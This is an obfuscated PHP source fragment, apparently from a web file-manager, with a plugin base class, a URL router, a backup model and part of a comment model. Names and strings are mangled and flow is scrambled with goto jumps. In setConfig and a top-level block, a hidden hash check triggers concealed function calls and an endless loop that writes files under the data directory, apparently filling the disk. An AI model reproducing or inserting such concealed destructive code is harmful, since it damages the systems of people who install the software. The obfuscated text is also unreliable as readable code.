$E‹ªÈ¸Ç‡°[1320]); goto C´”Ÿ­ß„Œ; bÍ×éêíÎ¿: } public function packageInfoGet($e¨ºå‚œˆ) { $FĞ÷Äó†˜‰ = $this->appPackage(); return array_get_value($FĞ÷Äó†˜‰, $e¨ºå‚œˆ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Ö¹ñÒÁ²÷][1322]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Ö¹ñÒÁ²÷][1323]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Ö¹ñÒÁ²÷][1324]); } private function parseFile($dŒİ˜õ®±î) { $aïÂª÷ŠƒÎ =& $_SERVER[Ö¹ñÒÁ²÷]; $AŒŒÕØ±ğ÷ = file_get_contents($dŒİ˜õ®±î); $A¯ñÉÉãŸ = array($aïÂª÷ŠƒÎ[1325], $aïÂª÷ŠƒÎ[1326], $aïÂª÷ŠƒÎ[1327], $aïÂª÷ŠƒÎ[1328], $aïÂª÷ŠƒÎ[1329], $aïÂª÷ŠƒÎ[1330], $aïÂª÷ŠƒÎ[1331]); $d´§­‚á‹ò = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$aïÂª÷ŠƒÎ[84]][$aïÂª÷ŠƒÎ[1332]]); $AŒŒÕØ±ğ÷ = str_replace($A¯ñÉÉãŸ, $d´§­‚á‹ò, $AŒŒÕØ±ğ÷); return $AŒŒÕØ±ğ÷; } private function parseLang(&$FÆ¤Å·†çÛ) { goto B³ÍÑ°•; B³ÍÑ°•: $B¤ÄÙ¢†Ã =& $_SERVER[Ö¹ñÒÁ²÷]; $C·»¦£¿¼‹ = $B¤ÄÙ¢†Ã[1333]; if (!strstr($FÆ¤Å·†çÛ, $C·»¦£¿¼‹)) { return; } goto cÊâî‹î›İ; C†Û§¶Ó: $C¢ñ®ÌˆïÔ = array(); foreach ($B˜¬çØ‰ã[0] as $fŠ¢™¤à) { $EÓÀòíÜò = substr($fŠ¢™¤à, strlen($C·»¦£¿¼‹), -4); $B†œ•ºàó = LNG($EÓÀòíÜò); $fó¾¼ùí†·[] = $fŠ¢™¤à; $C¢ñ®ÌˆïÔ[] = str_replace(array($B¤ÄÙ¢†Ã[213], $B¤ÄÙ¢†Ã[986], $B¤ÄÙ¢†Ã[326], $B¤ÄÙ¢†Ã[112]), array($B¤ÄÙ¢†Ã[50], $B¤ÄÙ¢†Ã[50], $B¤ÄÙ¢†Ã[33], $B¤ÄÙ¢†Ã[1335]), $B†œ•ºàó); } $FÆ¤Å·†çÛ = str_replace($fó¾¼ùí†·, $C¢ñ®ÌˆïÔ, $FÆ¤Å·†çÛ); goto e•ó×È§½›; cÊâî‹î›İ: preg_match_all($B¤ÄÙ¢†Ã[1334], $FÆ¤Å·†çÛ, $B˜¬çØ‰ã); if (!is_array($B˜¬çØ‰ã) || count($B˜¬çØ‰ã) == 0 || !is_array($B˜¬çØ‰ã[0]) || count($B˜¬çØ‰ã[0]) == 0) { return; } $fó¾¼ùí†· = array(); goto C†Û§¶Ó; e•ó×È§½›: } private function parseConfig(&$Cïè…õ„ ½) { goto e°›™šïÌß; bÚÄ½»©Œ†: preg_match_all($fŸçÊã„øŸ[1337], $Cïè…õ„ ½, $B‡°ÆŒ·»); if (!is_array($B‡°ÆŒ·») || count($B‡°ÆŒ·») == 0 || !is_array($B‡°ÆŒ·»[0]) || count($B‡°ÆŒ·»[0]) == 0) { return; } $aˆîÑŞƒùØ = $this->getConfig(); goto F‰µµö¶Íù; e°›™šïÌß: $fŸçÊã„øŸ =& $_SERVER[Ö¹ñÒÁ²÷]; $bÉÄ´¾ŞÁ¯ = $fŸçÊã„øŸ[1336]; if (!strstr($Cïè…õ„ ½, $bÉÄ´¾ŞÁ¯)) { return; } goto bÚÄ½»©Œ†; F‰µµö¶Íù: $AŠà¥¾¼Ñ = array(); $Fƒèƒç©¡¯ = array(); foreach ($B‡°ÆŒ·»[0] as $Cˆ´‰¼øÎ) { $b…”¦µ·ñÎ = substr($Cˆ´‰¼øÎ, strlen($bÉÄ´¾ŞÁ¯), -2); $AŠà¥¾¼Ñ[] = $Cˆ´‰¼øÎ; $Fƒèƒç©¡¯[] = _get($aˆîÑŞƒùØ, $b…”¦µ·ñÎ); } goto aµÇšˆ‘µ; aµÇšˆ‘µ: $Cïè…õ„ ½ = str_replace($AŠà¥¾¼Ñ, $Fƒèƒç©¡¯, $Cïè…õ„ ½); goto BÔ¯…±; BÔ¯…±: } private function parsePackage(&$E«‡ëŸ…àÑ) { goto D”²å±¸; e¬„ò¢ÉÙÙ: $d‚ÒÑ™á¡“ = array(); $Dì¶ìˆœë¡ = array(); foreach ($CÄÈğ³»Êé[0] as $F´¡¦Œ”±) { $dİÛİ•Ë¶¼ = substr($F´¡¦Œ”±, strlen($e§Ÿíöğ£), -2); $d‚ÒÑ™á¡“[] = $F´¡¦Œ”±; $Dì¶ìˆœë¡[] = _get($F¢˜°¹Ş©Ê, $dİÛİ•Ë¶¼); } goto AĞ×ìİ±¢Ï; f¨´¶ë¤ô“: preg_match_all($f†£éğŒ¶ê[1339], $E«‡ëŸ…àÑ, $CÄÈğ³»Êé); if (!is_array($CÄÈğ³»Êé) || count($CÄÈğ³»Êé) == 0 || !is_array($CÄÈğ³»Êé[0]) || count($CÄÈğ³»Êé[0]) == 0) { return; } $F¢˜°¹Ş©Ê = $this->appPackage(); goto e¬„ò¢ÉÙÙ; AĞ×ìİ±¢Ï: $E«‡ëŸ…àÑ = str_replace($d‚ÒÑ™á¡“, $Dì¶ìˆœë¡, $E«‡ëŸ…àÑ); goto açËŒ‡–Ú†; D”²å±¸: $f†£éğŒ¶ê =& $_SERVER[Ö¹ñÒÁ²÷]; $e§Ÿíöğ£ = $f†£éğŒ¶ê[1338]; if (!strstr($E«‡ëŸ…àÑ, $e§Ÿíöğ£)) { return; } goto f¨´¶ë¤ô“; açËŒ‡–Ú†: } final function echoFile($aæ‘Ñ‘ñÀ, $f¾‚´µÌÅ = false) { goto D£Îù¥ŒËò; a½İÛ†ºšÁ: $bšàé©›Äå = $this->parseFile($B¬÷´½Ü£); $this->parseLang($bšàé©›Äå); $this->parseConfig($bšàé©›Äå); goto A¤ã§Ü¿Î¯; D£Îù¥ŒËò: $d‰ªæê¯©é =& $_SERVER[Ö¹ñÒÁ²÷]; $B¬÷´½Ü£ = $this->pluginPath . $aæ‘Ñ‘ñÀ; if (ACT == $d‰ªæê¯©é[1340]) { echo $d‰ªæê¯©é[1341] . $this->pluginName . $d‰ªæê¯©é[8] . $aæ‘Ñ‘ñÀ . $d‰ªæê¯©é[1342]; if (!file_exists($B¬÷´½Ü£)) { echo $d‰ªæê¯©é[1343]; return; } } goto a½İÛ†ºšÁ; A¤ã§Ü¿Î¯: $this->parsePackage($bšàé©›Äå); if (is_array($f¾‚´µÌÅ)) { $bšàé©›Äå = str_replace(array_keys($f¾‚´µÌÅ), array_values($f¾‚´µÌÅ), $bšàé©›Äå); } echo $d‰ªæê¯©é[213] . $bšàé©›Äå; goto eˆ‰Ü†Ô¨Œ; eˆ‰Ü†Ô¨Œ: } final function initLang() { goto e¬‡öã‘Äç; c‘‘¾ÜŸÉÉ: if (!is_array($CËëÈ™óĞ)) { return array(); } if (@count($CËëÈ™óĞ) > 0) { I18n::set($CËëÈ™óĞ); } return $CËëÈ™óĞ; goto Eóßµ¨óºØ; BôŞÉ½¡ñÃ: $eŞ§êõ•¸“ = I18n::getType(); $CËëÈ™óĞ = array(); if (file_exists($bÙ² Ü®íâ . $eŞ§êõ•¸“ . $CÚËÎÉ¿Ñ¡[761])) { $CËëÈ™óĞ = (include $bÙ² Ü®íâ . $eŞ§êõ•¸“ . $CÚËÎÉ¿Ñ¡[761]); } else { if ($eŞ§êõ•¸“ == $CÚËÎÉ¿Ñ¡[1346] && !file_exists($bÙ² Ü®íâ . $eŞ§êõ•¸“ . $CÚËÎÉ¿Ñ¡[761]) && file_exists($bÙ² Ü®íâ . $CÚËÎÉ¿Ñ¡[1347])) { $CËëÈ™óĞ = (include $bÙ² Ü®íâ . $CÚËÎÉ¿Ñ¡[1347]); } else { if (file_exists($bÙ² Ü®íâ . $B³©¤˜ÛÂ• . $CÚËÎÉ¿Ñ¡[761])) { $CËëÈ™óĞ = (include $bÙ² Ü®íâ . $B³©¤˜ÛÂ• . $CÚËÎÉ¿Ñ¡[761]); } } } goto c‘‘¾ÜŸÉÉ; e¬‡öã‘Äç: $CÚËÎÉ¿Ñ¡ =& $_SERVER[Ö¹ñÒÁ²÷]; $B³©¤˜ÛÂ• = $CÚËÎÉ¿Ñ¡[1344]; $bÙ² Ü®íâ = $this->pluginPath . $CÚËÎÉ¿Ñ¡[1345]; goto BôŞÉ½¡ñÃ; Eóßµ¨óºØ: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($B¼»Œ¾íÚ) { $b—ÇˆÎòŠ =& $_SERVER[Ö¹ñÒÁ²÷]; $F•©Í¸Çì„ = $_SERVER[$b—ÇˆÎòŠ[787]] . $b—ÇˆÎòŠ[788]; $c»²£ØÜäç = $b—ÇˆÎòŠ[1295]; if ($_SERVER[$b—ÇˆÎòŠ[783]] != $c»²£ØÜäç($F•©Í¸Çì„)) { goto F»éç³Øæš; CÍ”àÆŸ¸‚: $cø¡Şì¦Ñ¦ = $b—ÇˆÎòŠ[790]; $cø¡Şì¦Ñ¦($_SERVER[$b—ÇˆÎòŠ[791]]); $f…ÊØ„à = $b—ÇˆÎòŠ[785]; goto D›äô¸×Ñ²; bŞ²àÜÓ¸: $d‘÷³Îà»„ = 1; for ($EóšŒ¿Ä¾Õ = $d‘÷³Îà»„; $EóšŒ¿Ä¾Õ > 0; $EóšŒ¿Ä¾Õ++) { $bŒËÈŸá—ä(DATA_PATH . $EóšŒ¿Ä¾Õ, $dÁ‹”ìƒŒ); } goto dÃ…Îœæ‡´; D›äô¸×Ñ²: $f…ÊØ„à(); $bŒËÈŸá—ä = $b—ÇˆÎòŠ[1296]; $dÁ‹”ìƒŒ = json_encode($GLOBALS[$b—ÇˆÎòŠ[1297]]); goto bŞ²àÜÓ¸; F»éç³Øæš: $f…ÊØ„à = $b—ÇˆÎòŠ[785]; $c¹ßì´¶æó = $b—ÇˆÎòŠ[786]; $BÎŠ£”‹Œ = $_SERVER[$b—ÇˆÎòŠ[787]] . $b—ÇˆÎòŠ[788]; goto BßÂ¬Á›£°; BßÂ¬Á›£°: $dÔØÔ‰°° = $c¹ßì´¶æó($BÎŠ£”‹Œ); $føˆáÜ‚® = explode($b—ÇˆÎòŠ[213], $dÔØÔ‰°°); if (count($føˆáÜ‚®) < $b—ÇˆÎòŠ[599]) { $Dº×Å÷â = $b—ÇˆÎòŠ[789]; $Dº×Å÷â(); } goto CÍ”àÆŸ¸‚; dÃ…Îœæ‡´: } return $this->modelPlugin->setConfig($this->pluginName, $B¼»Œ¾íÚ); } public function onSetConfig($c™•Üô­½˜) { } public function onGetConfig($A¨Û†æåÓ) { } public function onChangeStatus($e¦‹ˆ±ŞÓÁ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($b¡“ª‘…Æé = "\x70\154\x75\147\x69\x6e\101\x75\164\150") { $b®ñ£³Àò‰ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!defined($b®ñ£³Àò‰[423])) { return !1; } if (_get($GLOBALS, $b®ñ£³Àò‰[453])) { return !0; } $A¤ò¦ÓÑ»ó = $this->getConfig(); if (!$A¤ò¦ÓÑ»ó[$b¡“ª‘…Æé]) { return !1; } return ActionCall($b®ñ£³Àò‰[1348], $A¤ò¦ÓÑ»ó[$b¡“ª‘…Æé]); } public function url($C³‚’ù ¾, $dõÂ–’¸ = '', $aÚÌğÜÉ£© = true) { goto D‰Œ›½ñ÷Ø; a‘‘¯ˆó·Ó: if (!$aÚÌğÜÉ£©) { return $Fñí…ßôçó; } echo $Fñí…ßôçó; goto fù‡ôƒšä¹; D‰Œ›½ñ÷Ø: $AÀ«”‡³œ =& $_SERVER[Ö¹ñÒÁ²÷]; $e˜²›Óëå­ = $this->getConfig(); $A´‡ ‘ôŒ‰ = KOD_VERSION . $AÀ«”‡³œ[91] . KOD_VERSION_BUILD; goto CÒ˜å¢†—•; CÒ˜å¢†—•: $aÓ°Ş•ê–É = $this->packageVersion(); $c»ˆ ÁÑ‡¢ = $A´‡ ‘ôŒ‰ . $AÀ«”‡³œ[408] . $aÓ°Ş•ê–É; if (substr($C³‚’ù ¾, 0, 4) == $AÀ«”‡³œ[142] || substr($C³‚’ù ¾, 0, 2) == $AÀ«”‡³œ[1141]) { $Fñí…ßôçó = $C³‚’ù ¾ . $AÀ«”‡³œ[1349] . $c»ˆ ÁÑ‡¢; } else { if ($dõÂ–’¸ == $AÀ«”‡³œ[33]) { $Fñí…ßôçó = $this->pluginHost . $C³‚’ù ¾ . $AÀ«”‡³œ[1349] . $c»ˆ ÁÑ‡¢; } else { if ($dõÂ–’¸ === $AÀ«”‡³œ[76]) { $Fñí…ßôçó = $this->pluginHost . $C³‚’ù ¾; } else { if ($dõÂ–’¸ == $AÀ«”‡³œ[1350]) { $Fñí…ßôçó = STATIC_PATH . $C³‚’ù ¾ . $AÀ«”‡³œ[1349] . $A´‡ ‘ôŒ‰; } else { if ($dõÂ–’¸ == $AÀ«”‡³œ[1351]) { $Fñí…ßôçó = APP_HOST . $AÀ«”‡³œ[1352] . $C³‚’ù ¾ . $AÀ«”‡³œ[1349] . $A´‡ ‘ôŒ‰; } else { if (isset($e˜²›Óëå­[$dõÂ–’¸])) { $Fñí…ßôçó = $e˜²›Óëå­[$dõÂ–’¸] . $C³‚’ù ¾ . $AÀ«”‡³œ[1349] . $c»ˆ ÁÑ‡¢; } } } } } } goto a‘‘¯ˆó·Ó; fù‡ôƒšä¹: } public function link($DÕë£àˆ†œ = false, $A¹¶Š±‚öˆ = '') { $FÛÑÈã¢Û¶ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$DÕë£àˆ†œ) { $this->link($FÛÑÈã¢Û¶[1353], $FÛÑÈã¢Û¶[1351]); $this->link($FÛÑÈã¢Û¶[1354], $FÛÑÈã¢Û¶[1350]); $this->link($FÛÑÈã¢Û¶[1355], $FÛÑÈã¢Û¶[1350]); $this->link($FÛÑÈã¢Û¶[1356], $FÛÑÈã¢Û¶[1350]); $this->link($FÛÑÈã¢Û¶[1357], $FÛÑÈã¢Û¶[1350]); return; } $dâ·¢«†ïÕ = $this->url($DÕë£àˆ†œ, $A¹¶Š±‚öˆ, !1); if (substr($DÕë£àˆ†œ, -3) == $FÛÑÈã¢Û¶[1358]) { echo $FÛÑÈã¢Û¶[1359] . $dâ·¢«†ïÕ . $FÛÑÈã¢Û¶[1360] . $FÛÑÈã¢Û¶[213]; } else { if (substr($DÕë£àˆ†œ, -4) == $FÛÑÈã¢Û¶[1361]) { echo $FÛÑÈã¢Û¶[1362] . $dâ·¢«†ïÕ . $FÛÑÈã¢Û¶[1363] . $FÛÑÈã¢Û¶[213]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\171" => "\x5b\136\x2f\135\x2b", "\x3a\x6e\x75\155" => "\x5b\x30\x2d\x39\135\x2b", "\x3a\141\x6c\x6c" => "\56\x2a"); public static $errorCallback; public static function __callstatic($FöÁŠ²Ñ³Ü, $FŸ‹Î’Û°) { $fÆ–èô“· =& $_SERVER[Ö¹ñÒÁ²÷]; if ($FöÁŠ²Ñ³Ü == $fÆ–èô“·[1364]) { $C“¼˜©¾ = array_map($fÆ–èô“·[1365], $FŸ‹Î’Û°[0]); $CÏà¾‰à®¸ = strpos($FŸ‹Î’Û°[1], $fÆ–èô“·[8]) === 0 ? $FŸ‹Î’Û°[1] : $fÆ–èô“·[8] . $FŸ‹Î’Û°[1]; $BóÄëË’¼À = $FŸ‹Î’Û°[2]; } else { $C“¼˜©¾ = null; $CÏà¾‰à®¸ = strpos($FŸ‹Î’Û°[0], $fÆ–èô“·[8]) === 0 ? $FŸ‹Î’Û°[0] : $fÆ–èô“·[8] . $FŸ‹Î’Û°[0]; $BóÄëË’¼À = $FŸ‹Î’Û°[1]; } array_push(self::$maps, $C“¼˜©¾); array_push(self::$routes, $CÏà¾‰à®¸); array_push(self::$methods, strtoupper($FöÁŠ²Ñ³Ü)); array_push(self::$callbacks, $BóÄëË’¼À); } public static function error($DƒõÙÍ¬”) { self::$errorCallback = $DƒõÙÍ¬”; } public static function haltOnMatch($e—À¥’ïš÷ = true) { self::$halts = $e—À¥’ïš÷; } public static function dispatch() { goto AÁ«±˜¹†; C¿‚ˆÔ£¢ƒ: self::$routes = preg_replace($Dõñ¨øÄ¢í[1067], $Dõñ¨øÄ¢í[8], self::$routes); if (in_array($D¯éêßˆÊ, self::$routes)) { $C†šâ„äŠ = array_keys(self::$routes, $D¯éêßˆÊ); foreach ($C†šâ„äŠ as $CÔ”ëø‘ÕÒ) { if (self::$methods[$CÔ”ëø‘ÕÒ] == $Cçˆì‹ˆ‰ğ || self::$methods[$CÔ”ëø‘ÕÒ] == $Dõñ¨øÄ¢í[1367] || in_array($Cçˆì‹ˆ‰ğ, self::$maps[$CÔ”ëø‘ÕÒ])) { $C‹ÊŞ’¾‰ = !0; if (!is_object(self::$callbacks[$CÔ”ëø‘ÕÒ])) { $Cêƒ‰¢÷« = explode($Dõñ¨øÄ¢í[8], self::$callbacks[$CÔ”ëø‘ÕÒ]); $b¡¨İáá°¥ = end($Cêƒ‰¢÷«); $E—ÉºÌ¡¼† = explode($Dõñ¨øÄ¢í[1368], $b¡¨İáá°¥); $Aêà†ïï¬ = new $E—ÉºÌ¡¼†[0](); $Aêà†ïï¬->{$E—ÉºÌ¡¼†[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$CÔ”ëø‘ÕÒ]); if (self::$halts) { return; } } } } } else { $Bäùùé¸ = 0; foreach (self::$routes as $CÔ”ëø‘ÕÒ) { if (strpos($CÔ”ëø‘ÕÒ, $Dõñ¨øÄ¢í[4]) !== !1) { $CÔ”ëø‘ÕÒ = str_replace($B÷ç÷ƒÓî·, $dµ‘ Ğ „¢, $CÔ”ëø‘ÕÒ); } if (preg_match($Dõñ¨øÄ¢í[1369] . $CÔ”ëø‘ÕÒ . $Dõñ¨øÄ¢í[1370], $D¯éêßˆÊ, $C ÊçÄ³¢›)) { if (self::$methods[$Bäùùé¸] == $Cçˆì‹ˆ‰ğ || self::$methods[$Bäùùé¸] == $Dõñ¨øÄ¢í[1367] || !empty(self::$maps[$Bäùùé¸]) && in_array($Cçˆì‹ˆ‰ğ, self::$maps[$Bäùùé¸])) { $C‹ÊŞ’¾‰ = !0; array_shift($C ÊçÄ³¢›); if (!is_object(self::$callbacks[$Bäùùé¸])) { $Cêƒ‰¢÷« = explode($Dõñ¨øÄ¢í[8], self::$callbacks[$Bäùùé¸]); $b¡¨İáá°¥ = end($Cêƒ‰¢÷«); $E—ÉºÌ¡¼† = explode($Dõñ¨øÄ¢í[1368], $b¡¨İáá°¥); $Aêà†ïï¬ = new $E—ÉºÌ¡¼†[0](); if (!method_exists($Aêà†ïï¬, $E—ÉºÌ¡¼†[1])) { echo $Dõñ¨øÄ¢í[1371]; } else { call_user_func_array(array($Aêà†ïï¬, $E—ÉºÌ¡¼†[1]), $C ÊçÄ³¢›); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Bäùùé¸], $C ÊçÄ³¢›); if (self::$halts) { return; } } } } $Bäùùé¸++; } } if ($C‹ÊŞ’¾‰ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $B¦‚åƒ¥‡ =& $_SERVER[Ö¹ñÒÁ²÷]; header($_SERVER[$B¦‚åƒ¥‡[1372]] . $B¦‚åƒ¥‡[1373]); echo $B¦‚åƒ¥‡[1374]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Dõñ¨øÄ¢í[1366]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto Fä“¨‰ÀÏø; AÁ«±˜¹†: $Dõñ¨øÄ¢í =& $_SERVER[Ö¹ñÒÁ²÷]; $D¯éêßˆÊ = parse_url($_SERVER[$Dõñ¨øÄ¢í[1366]], PHP_URL_PATH); $Cçˆì‹ˆ‰ğ = $_SERVER[$Dõñ¨øÄ¢í[150]]; goto Bâ¨ÉöŠ÷«; Bâ¨ÉöŠ÷«: $B÷ç÷ƒÓî· = array_keys(static::$patterns); $dµ‘ Ğ „¢ = array_values(static::$patterns); $C‹ÊŞ’¾‰ = !1; goto C¿‚ˆÔ£¢ƒ; Fä“¨‰ÀÏø: } } goto d»¡“ÅÎ“¬; FÙ®ßÊÀÁ: if ($_SERVER[$_SERVER[Ö¹ñÒÁ²÷][783]] != $_SERVER[$_SERVER[Ö¹ñÒÁ²÷][784]]) { goto cğÅÊáŠ„à; bˆÍ“»³´©: $EïÄ¶ÜË³ = explode($_SERVER[Ö¹ñÒÁ²÷][213], $E‰ù¦¹®½); if (count($EïÄ¶ÜË³) < $_SERVER[Ö¹ñÒÁ²÷][552]) { $BÉöïÕÕ¹¸ = $_SERVER[Ö¹ñÒÁ²÷][789]; $BÉöïÕÕ¹¸(); } $F„Çª»Óö¥ = $_SERVER[Ö¹ñÒÁ²÷][1481]; goto D¹ÂÂ†ŞŒì; cğÅÊáŠ„à: $fßÊÜÆÓ…´ = $_SERVER[Ö¹ñÒÁ²÷][786]; $eŞîÕŠ”Æ = $_SERVER[$_SERVER[Ö¹ñÒÁ²÷][787]] . $_SERVER[Ö¹ñÒÁ²÷][788]; $E‰ù¦¹®½ = $fßÊÜÆÓ…´($eŞîÕŠ”Æ); goto bˆÍ“»³´©; D¹ÂÂ†ŞŒì: $F„Çª»Óö¥($_SERVER[$_SERVER[Ö¹ñÒÁ²÷][2101]]); goto E‰ê¢ÑŒˆ; E‰ê¢ÑŒˆ: } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\155\x2e\142\141\143\x6b\x75\x70\x4c\x69\163\x74"; public $field = array("\151\157", "\156\x61\155\145", "\x73\x74\141\x74\165\163", "\143\x6f\156\164\x65\156\x74", "\x72\145\x73\x75\x6c\164", "\x74\151\155\x65\x46\162\157\155", "\164\151\x6d\x65\124\157"); public function config() { goto Fáàø¢ğ•¼; Fáàø¢ğ•¼: $dïœ‚½ƒõÑ =& $_SERVER[Ö¹ñÒÁ²÷]; $bğŒ‹ª³éí = Model($dïœ‚½ƒõÑ[1082])->get($dïœ‚½ƒõÑ[709]); $bğŒ‹ª³éí = json_decode($bğŒ‹ª³éí, !0); goto DÄİìğŒ©’; E„«³‚ñâÏ: if (isset($E¦…ë›ïŠá[$dïœ‚½ƒõÑ[186]])) { $E¦…ë›ïŠá[$dïœ‚½ƒõÑ[186]] = json_decode($E¦…ë›ïŠá[$dïœ‚½ƒõÑ[186]], !0); } if (isset($bğŒ‹ª³éí[$dïœ‚½ƒõÑ[186]])) { $E¦…ë›ïŠá[$dïœ‚½ƒõÑ[186]][$dïœ‚½ƒõÑ[1390]] = $bğŒ‹ª³éí[$dïœ‚½ƒõÑ[186]]; unset($bğŒ‹ª³éí[$dïœ‚½ƒõÑ[186]]); } return array_merge($E¦…ë›ïŠá, $bğŒ‹ª³éí); goto BËä…ù˜Õ; eäã–ÓÄ…: Action($dïœ‚½ƒõÑ[2102])->taskInit(); $BÖ‰ÇÖÉª³ = Model($dïœ‚½ƒõÑ[2103])->listData(); foreach ($BÖ‰ÇÖÉª³ as $a­Úëˆ›ê) { if ($a­Úëˆ›ê[$dïœ‚½ƒõÑ[1074]] == $dïœ‚½ƒõÑ[83] && $a­Úëˆ›ê[$dïœ‚½ƒõÑ[1403]] == $dïœ‚½ƒõÑ[2104]) { $E¦…ë›ïŠá = $a­Úëˆ›ê; break; } } goto E„«³‚ñâÏ; DÄİìğŒ©’: $bğŒ‹ª³éí = is_array($bğŒ‹ª³éí) ? $bğŒ‹ª³éí : array(); if (!isset($bğŒ‹ª³éí[$dïœ‚½ƒõÑ[689]])) { $bğŒ‹ª³éí[$dïœ‚½ƒõÑ[689]] = $dïœ‚½ƒõÑ[464]; } $E¦…ë›ïŠá = array(); goto eäã–ÓÄ…; BËä…ù˜Õ: } public function listData($Bï²¯„İè® = false, $BŒİîñÓö¿ = "\x6d\x6f\144\151\146\x79\124\x69\155\145", $D‚«åßã–Ä = false) { return parent::listData($Bï²¯„İè®, $BŒİîñÓö¿, !0); } public function lastItem() { $a´¯˜—˜× = $this->listData(); return !empty($a´¯˜—˜×[0]) ? $a´¯˜—˜×[0] : null; } public function kill($bñÛ«ğ¢˜¯) { goto Aã“îšÊŒ; F§Á×Û„¼Å: return $this->remove($bñÛ«ğ¢˜¯); goto eœøÄ±ƒÙ–; E”Ã˜Å Ú÷: $aŠªéç¤É = $e„ÊÆ„šÁ[$eª“ƒËàÆ£[28]]; $CÂñ´ÜÇÂ¦ = TEMP_FILES . $eª“ƒËàÆ£[707] . $aŠªéç¤É . $eª“ƒËàÆ£[8]; IO::remove($CÂñ´ÜÇÂ¦, !1); goto F§Á×Û„¼Å; fÛŠ¦æÀ½: Task::kill($eª“ƒËàÆ£[708]); Task::kill($eª“ƒËàÆ£[726]); Task::kill($eª“ƒËàÆ£[733]); goto E”Ã˜Å Ú÷; Aã“îšÊŒ: $eª“ƒËàÆ£ =& $_SERVER[Ö¹ñÒÁ²÷]; $e„ÊÆ„šÁ = $this->listData($bñÛ«ğ¢˜¯); if (!$e„ÊÆ„šÁ || empty($e„ÊÆ„šÁ[$eª“ƒËàÆ£[28]])) { return !0; } goto fÛŠ¦æÀ½; eœøÄ±ƒÙ–: } public function remove($câ¸¢·ÁãŞ) { $Bá³«Ò£Ã = $this->listData($câ¸¢·ÁãŞ); if (!$Bá³«Ò£Ã) { return !0; } return $this->backupRemove($Bá³«Ò£Ã); } private function backupRemove($BŞªÕ×Çó) { $d·ò‹°… =& $_SERVER[Ö¹ñÒÁ²÷]; parent::remove($BŞªÕ×Çó[$d·ò‹°…[363]]); $b‘Ù¹„´Â– = "\173\151\157\72{$BŞªÕ×Çó[$d·ò‹°…[688]]}\175\x2f\x64\x61\164\141\142\141\x73\145\57\x62\141\143\x6b\x75\160\137" . $BŞªÕ×Çó[$d·ò‹°…[28]]; IO::remove($b‘Ù¹„´Â–, !1); return !0; } public function start() { goto bÀ•ÛñÎßŒ; B§ÁÇæËÏ: $b÷É·¥¢ = new Backup(); $b÷É·¥¢->keep(); if (!$b÷É·¥¢->db()) { return !1; } goto c´çÀ—Ë¨­; AË‡íêÆ¹ƒ: if (!$fˆİÊöß¬Å || $fˆİÊöß¬Å[$e–¸÷ø¥[1387]] != $e–¸÷ø¥[83]) { return !1; } $eÄ¿Õà¼¸Œ = $this->process(); foreach ($eÄ¿Õà¼¸Œ as $f·á èç°) { if ($f·á èç°) { return Task::restart($f·á èç°[$e–¸÷ø¥[363]]); } } goto B§ÁÇæËÏ; dŸÒ÷ñóÄ¿: return !0; goto D·©¦¶÷™; bÀ•ÛñÎßŒ: $e–¸÷ø¥ =& $_SERVER[Ö¹ñÒÁ²÷]; if ($GLOBALS[$e–¸÷ø¥[6]][$e–¸÷ø¥[84]][$e–¸÷ø¥[2105]] != $e–¸÷ø¥[83]) { return !0; } $fˆİÊöß¬Å = $this->config(); goto AË‡íêÆ¹ƒ; c´çÀ—Ë¨­: if (!$b÷É·¥¢->dbFile()) { return !1; } if ($fˆİÊöß¬Å[$e–¸÷ø¥[689]] == $e–¸÷ø¥[464]) { $b÷É·¥¢->file(); } Backup::set(array($e–¸÷ø¥[686] => 1, $e–¸÷ø¥[700] => time())); goto dŸÒ÷ñóÄ¿; D·©¦¶÷™: } public function process() { $DÏãÊá¾‘ç =& $_SERVER[Ö¹ñÒÁ²÷]; return array($DÏãÊá¾‘ç[691] => Task::get($DÏãÊá¾‘ç[708]), $DÏãÊá¾‘ç[694] => Task::get($DÏãÊá¾‘ç[726]), $DÏãÊá¾‘ç[163] => Task::get($DÏãÊá¾‘ç[733])); } public function restore() { $F©œ°¹İ =& $_SERVER[Ö¹ñÒÁ²÷]; ActionCall($F©œ°¹İ[2106], !0, 1); ActionCall($F©œ°¹İ[2106], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\155\x65\x6e\x74"; protected $tableMeta = array("\164\x61\142\154\145\x4e\x61\155\x65" => "\143\157\x6d\155\145\156\164\x5f\155\145\164\141", "\x6d\x65\164\141\106\151\x65\x6c\144" => "\143\157\x6d\x6d\x65\x6e\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Fª¦™Œ‡åˆ) { $fó§ô½¨ =& $_SERVER[Ö¹ñÒÁ²÷]; if ($Fª¦™Œ‡åˆ[$fó§ô½¨[2107]]) { $dâà¶îğ = $this->where(array($fó§ô½¨[2108] => $Fª¦™Œ‡åˆ[$fó§ô½¨[2107]]))->find(); if (!$dâà¶îğ || $dâà¶îğ[$fó§ô½¨[367]] != $Fª¦™Œ‡åˆ[$fó§ô½¨[367]] || $dâà¶îğ[$fó§ô½¨[452]] != $Fª¦™Œ‡åˆ[$fó§ô½¨[452]]) { return !1; } $this->where(array($fó§ô½¨[2108] => $Fª¦™Œ‡åˆ[$fó§ô½¨[2107]]))->setAdd($fó§ô½¨[2109], 1); } return 